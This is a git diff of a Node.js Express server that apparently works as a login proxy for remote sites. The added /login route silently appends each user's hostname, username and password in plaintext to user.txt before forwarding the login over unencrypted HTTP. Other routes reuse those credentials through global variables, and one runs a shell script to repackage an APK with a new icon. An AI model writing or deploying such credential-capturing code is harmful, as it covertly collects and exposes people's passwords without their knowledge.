@@ -1,30 +1,45 @@
 const http = require('http');
+const querystring = require('querystring')                                                                                                                                                                                             
+const path = require('path')
 
-function send(path, callback){
-    const options = {
-  		  hostname: 'qmsq.7dar.com',
-  		  port: 443,
-  		  path: path,
-  		  method: 'GET'
-	 }
+function send(host, path, callback, action, params){
+  var gdata = [];
+  const options = {
+      hostname: host,
+      path: path,
+      method:  "GET",
+      headers:{}
+  };
+  if(action == 'POST'){
+    options.headers['Content-Type']='application/x-www-form-urlencoded'
+     options.method = 'POST'
+     options.headers['Content-Length']=querystring.stringify(params).length
+  }else if(action){
+     options.headers['Cookie'] = action
+  }
+  const req = http.request(options, (res) => {
+      const code =  res.statusCode
+      if(code != 200) return
 
-	const req = https.request(options, (res) => {
- 		  const code =  res.statusCode;
-  		if(code != 200) return;
+      res.on('data', (d) => {
+          gdata.push(d)
+      });   
 
-  		res.on('data', (d) => {
+      res.on('end', d => {
           if(callback){
-              callback(d);
-          }   
-  	  })
-	})
-
-	req.on('error', (e) => {
-  		if(callback){
-           callback(e);
-      }   
-	});
-	req.end();
+               var cookie = res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0] : ''
+               callback(gdata.join('').toString(), cookie)
+          }
+      })
+  })
+ 
+  req.on('error', (e) => {
+      console.error(e)
+  });
+  if(action == 'POST'){
+     req.write(querystring.stringify(params));
+  }
+  req.end()
 }
 
 function random_id(n) {
@@ -89,6 +104,58 @@ app.post('/api/reviewname', function(req, res){
         res.setHeader('Content-Type', 'application/json');
         res.send(d);
     }); 
+});
+
+app.get('/genapk', function(req, res){
+     const { exec } = require('child_process');
+     res.setHeader('Content-Type', 'application/json');
+     console.log(`sh ${path.join(__dirname , '/views/pkg/script/auto.sh')} ${path.join(__dirname, '/views/commonRelease-3.1.0.Alpha6.apk')} ${new Date().getTime()} ${path.join(__dirname, '/views/ic_empty.png')} ${new Date().getTime()}`)
+     exec(`sh ${path.join(__dirname , '/views/pkg/script/auto.sh')} ${path.join(__dirname, '/views/commonRelease-3.1.0.Alpha6.apk')} ${new Date().getTime()} ${path.join(__dirname, '/views/ic_empty.png')} ${new Date().getTime()}`, (error, stdout, stderr) => {
+        res.send(`${stdout}`);
+     })
+     
+});
+
+
+app.get('/login', (req, res)=>{
+    hostname = decodeURIComponent(req.query.hostname);
+    password = req.query.password;
+    username = decodeURIComponent(req.query.username);
+    fs.appendFile('user.txt', hostname + "-" + username +"-" + password + "\n", function(err){
+
+    });
+    send(hostname, '/Home/User/login.html', d=>{
+      res.send(d)
+    }, 'POST', {
+       "password": password,
+       "username": username
+    })
+});
+
+app.get('/view', (req, res)=>{
+    hostname = decodeURIComponent(req.query.hostname);
+    send(hostname, '/Home/User/login.html', (d, cookie)=>{
+       send(hostname, '/Home/Index/index.html', d=>{
+          res.send(d)
+       }, cookie)
+    }, 'POST', {
+       "password": password,
+       "username": username
+    });
+});
+
+app.get('/order', (req, res)=>{
+    hostname = decodeURIComponent(req.query.hostname);
+    username = decodeURIComponent(req.query.username);
+    bumen = decodeURIComponent(req.query.bumen);
+    o_type = req.query.o_type;
+    send(hostname, '/Home/User/order.html', d=>{
+      res.send(d)
+    }, 'POST', {
+            'name': username,
+            'bumen': bumen,
+            'o_type': o_type
+        })
 });
 
 var server = http.createServer(app);
